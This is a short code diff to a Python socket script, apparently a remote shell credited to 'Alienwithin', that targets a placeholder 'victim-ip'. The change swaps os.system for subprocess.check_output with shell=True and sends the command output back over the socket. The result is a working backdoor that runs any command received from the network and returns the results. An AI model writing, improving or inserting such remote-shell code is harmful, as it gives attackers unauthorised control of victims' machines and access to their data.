@@ -13,7 +13,7 @@ __status__ = "Production"
 #         by Alienwithin
 ###########################################
 import socket
-import os
+import subprocess
 import sys
 
 ip = "victim-ip"
@@ -38,4 +38,5 @@ while True:
 		client.close()
 		sys.exit(0)
 	else:
-		os.system(data)
+		output = subprocess.check_output(data, shell=True)
+		client.sendall(output)
